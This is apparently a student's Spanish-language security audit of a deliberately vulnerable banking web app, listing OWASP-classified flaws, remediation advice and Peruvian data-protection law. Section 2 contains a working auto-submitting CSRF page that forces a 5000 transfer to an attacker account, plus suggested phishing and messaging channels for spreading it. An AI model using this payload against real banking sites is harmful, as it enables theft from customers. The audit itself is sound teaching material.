# Práctica: Auditoría de Seguridad - BancoNacional.pe

Alumno: Carbajal Armando

## Caso Práctico

Se realizó un análisis de seguridad del código fuente de la aplicación **BancoNacional.pe**, identificando las principales vulnerabilidades, su clasificación según **OWASP Top 10 (2021)**, el impacto potencial y las recomendaciones de mejora.

---

# 1. Identificación de vulnerabilidades

| Línea aprox. | Vulnerabilidad | Descripción | OWASP Top 10 (2021) | Severidad |
|--------------|----------------|-------------|----------------------|-----------|
| 8 | Secret Key hardcodeada | La clave de sesión (`app.secret_key`) está escrita directamente en el código fuente. Si un atacante obtiene el código, podría falsificar sesiones de usuarios. | A05 – Security Misconfiguration | Alta |
| 13-14 | Credenciales hardcodeadas | La contraseña y la URL de la base de datos de producción están almacenadas directamente en el código. | A05 – Security Misconfiguration | Crítica |
| 25 | Uso de MD5 | Las contraseñas se cifran utilizando MD5, algoritmo considerado inseguro debido a su vulnerabilidad frente a ataques de fuerza bruta y tablas rainbow. | A02 – Cryptographic Failures | Alta |
| 31-33 | SQL Injection en login | La consulta SQL se construye concatenando directamente los datos ingresados por el usuario. | A03 – Injection | Crítica |
| 40 | Rol asignado de forma fija | El sistema asigna siempre el rol **cliente**, sin consultar el rol real almacenado en la base de datos. | A01 – Broken Access Control | Media |
| 42 | Registro de contraseñas en logs | Se almacena la contraseña del usuario en texto plano dentro de los registros del sistema. | A09 – Security Logging and Monitoring Failures | Alta |
| 55 | Ausencia de protección CSRF | La función de transferencia no valida un token CSRF, permitiendo solicitudes fraudulentas desde sitios externos. | A01 – Broken Access Control | Crítica |
| 58-61 | SQL Injection mediante monto | El valor del monto se concatena directamente en la consulta SQL. | A03 – Injection | Crítica |
| 62-65 | SQL Injection mediante destino | El número de cuenta destino también se concatena directamente en la consulta SQL. | A03 – Injection | Crítica |
| 54 | Sin validación del monto | No se verifica que el monto sea un número válido ni que sea mayor a cero. | A04 – Insecure Design | Alta |
| 73 | Acceso administrativo sin autorización | La ruta `/admin/usuarios` no verifica el rol del usuario autenticado. | A01 – Broken Access Control | Crítica |
| 76 | Exposición de información sensible | Se muestran el hash de la contraseña, saldo y correo electrónico de todos los usuarios. | A01 – Broken Access Control | Alta |
| 10-11 | Sin `SESSION_COOKIE_HTTPONLY` | La cookie de sesión puede ser accedida mediante JavaScript si existe una vulnerabilidad XSS. | A05 – Security Misconfiguration | Alta |
| 10-11 | Sin `SESSION_COOKIE_SAMESITE` | La cookie puede enviarse desde otros sitios web, facilitando ataques CSRF. | A05 – Security Misconfiguration | Alta |

> **Resultado del análisis:** Aunque el enunciado indica que existen al menos ocho vulnerabilidades, durante la auditoría se identificaron **14 vulnerabilidades** relacionadas con autenticación, autorización, criptografía, configuración y validación de datos.

---

# 2. Construcción del ataque CSRF

## HTML del ataque

```html
<!DOCTYPE html>
<html>
<head>
    <title>Promoción exclusiva</title>
</head>

<body onload="document.forms[0].submit()">

<form action="http://127.0.0.1:5000/transferir" method="POST">

    <input type="hidden" name="destino" value="999999999">

    <input type="hidden" name="monto" value="5000">

</form>

<p>Cargando promoción...</p>

</body>
</html>
```

> En un entorno real, la URL correspondería al dominio del banco, por ejemplo:

```text
https://banconacional.pe/transferir
```

### ¿Dónde publicaría este HTML un atacante?

Un atacante podría distribuir esta página mediante:

- Un sitio web malicioso.
- Correos electrónicos de phishing.
- Enlaces enviados por WhatsApp o Telegram.
- Redes sociales.
- Publicidad maliciosa.
- Foros o páginas comprometidas.

Cuando un usuario autenticado visite esa página, el navegador enviará automáticamente la cookie de sesión al banco y ejecutará la transferencia sin el consentimiento del cliente.

---

# 3. Riesgo de registrar la contraseña en texto plano

Además del problema evidente de almacenar la contraseña en texto plano, esta práctica genera riesgos adicionales:

- Un atacante que obtenga los archivos de log conocerá las credenciales reales de los usuarios.
- Los administradores o cualquier persona con acceso a los registros también podrán visualizar las contraseñas.
- Muchos usuarios reutilizan sus contraseñas en otros servicios (correo electrónico, redes sociales, banca, etc.), facilitando ataques de **Credential Stuffing**.
- Los archivos de log suelen almacenarse durante largos periodos o enviarse a servidores centralizados, aumentando la exposición de información sensible.
- Se incumple el principio de mínima exposición de datos confidenciales.

---

# 4. Reescritura segura de las funciones

## Mejoras para `login()`

Se recomienda implementar las siguientes medidas:

- Utilizar **bcrypt**, **Argon2** o **PBKDF2** en lugar de MD5.
- Emplear consultas parametrizadas para evitar SQL Injection.
- No registrar la contraseña en los logs.
- Obtener el rol real del usuario desde la base de datos.
- Implementar un manejo adecuado de errores.

## Mejoras para `transferir()`

Se recomienda:

- Implementar protección mediante token **CSRF**.
- Validar que el monto sea numérico y mayor que cero.
- Verificar que el usuario disponga de saldo suficiente.
- Utilizar consultas parametrizadas.
- Validar la existencia de la cuenta destino.
- Registrar únicamente información necesaria para auditoría sin exponer datos sensibles.

---

# 5. Impacto y normativa peruana

## Impacto para los clientes

La explotación de estas vulnerabilidades podría ocasionar:

- Transferencias bancarias fraudulentas.
- Robo de dinero.
- Acceso no autorizado a cuentas bancarias.
- Exposición de datos personales y financieros.
- Robo de credenciales.
- Suplantación de identidad.
- Pérdida de confianza de los clientes.
- Daños económicos y reputacionales para la entidad financiera.

## ¿Viola normativa peruana?

Sí. Entre las principales normas aplicables se encuentran:

- **Ley N.° 29733 – Ley de Protección de Datos Personales.**
- **Reglamento de la Ley N.° 29733 (D.S. N.° 003-2013-JUS).**
- **Reglamento para la Gestión de la Seguridad de la Información y la Ciberseguridad de la SBS**, aplicable a entidades supervisadas.

Estas normas exigen implementar medidas técnicas y organizativas que garanticen la confidencialidad, integridad y disponibilidad de la información, así como la protección de los datos personales de los usuarios.

---

# Conclusiones

El análisis permitió identificar múltiples vulnerabilidades críticas, como **SQL Injection, CSRF, Broken Access Control, uso de MD5 y exposición de información sensible**.

Estas fallas podrían permitir el acceso no autorizado a datos y la realización de transferencias fraudulentas. Por ello, es necesario aplicar las buenas prácticas de **OWASP Top 10 (2021)** y cumplir con la normativa peruana de protección de datos y seguridad de la información.